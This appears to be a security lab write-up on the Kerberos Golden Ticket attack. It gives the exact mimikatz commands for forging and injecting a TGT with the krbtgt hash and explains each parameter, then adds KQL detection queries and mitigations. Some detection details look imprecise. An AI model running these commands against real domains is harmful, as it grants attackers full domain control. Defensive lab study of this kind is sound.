# Attack Scenario: Golden Ticket Attack
The Golden Ticket attack involves forging a Kerberos Ticket Granting Ticket (TGT) using the krbtgt account’s NTLM hash. This allows an attacker to impersonate any user, including Domain Admins, for any service in the domain — with or without a corresponding AD object.

This attack is typically used after a successful DCSync operation.

## MITRE ATT&CK Techniques:

T1558.001 – Forge Kerberos Tickets (Golden Ticket)

T1550.002 – Use of Valid Accounts: Pass-the-Ticket

## Lab Environment
- **Domain Controller:** dc01.internal.lab
- **Domain:** internal.lab
- **SID:** S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX
- **NTLM hash of krbtgt obtained via DCSync**
- **Attacker system:** attacker-vm

## Preconditions:

- Attacker has retrieved the krbtgt NTLM hash and domain SID
- Attacker has mimikatz or similar tooling available

## Objectives
Forge a valid Kerberos TGT with arbitrary user details

Inject the forged ticket into the current session

Access privileged network resources (e.g., C$ shares, AD services)

## Execution Steps
Forge Golden Ticket

Using mimikatz:

```kerberos::golden /user:Administrator /domain:internal.lab /sid:S-1-5-21-XXXXXXXXX /krbtgt:<NTLMHASH> /id:500 /groups:512 /ptt```

Parameters:

/user: - the fake username (can be real or fabricated)

/domain: - AD domain name

/sid: - domain SID

/krbtgt: - NTLM hash from DCSync

/id:500 - RID of the impersonated user (500 = Administrator)

/groups: - group RIDs (e.g., 512 = Domain Admins)

/ptt - injects the ticket into current session

Confirm Ticket Injection

```kerberos::list```

Ensure a TGT is present for the spoofed user.

## Access Resources

Try to access:

```dir \\dc01.internal.lab\C$```

Or use PsExec, WMI, or RDP to confirm administrative access.

## Detection Guidance
### Logs and Indicators
Unusual Kerberos ticket activity from non-privileged hosts

4624 logon events with high-privilege SIDs from suspicious systems

4768/4769/4770 events where TGTs or TGSs are issued from suspicious clients

### Detection Queries (KQL - Microsoft Sentinel)
Suspicious Logon with Domain Admin RID (500):

```
SecurityEvent
| where EventID == 4624
| where TargetUserSid endswith "-500"
| where Account != "Administrator"
```

Unusual number of group RIDs in ticket:

```
SecurityEvent
| where EventID == 4624
| where LogonProcessName == "Kerberos"
| where AccountType == "User"
| extend GroupCount = array_length(SupplementaryGroups)
| where GroupCount > 10
```

## Mitigations
Regularly rotate the krbtgt password (twice if possible)

Detect and block anomalous ticket lifetimes and SID values

Monitor use of administrative group RIDs from non-standard hosts

Use tiered admin model to isolate Domain Admin access to jump boxes

## References
https://adsecurity.org/?p=1640

https://www.harmj0y.net/blog/redteaming/kerberos-attacks/

https://attack.mitre.org/techniques/T1558/001/

https://github.com/gentilkiwi/mimikatz

## Navigation
[Back to Lab Index:](../../README.md)
[Related: NTLM Relay]()

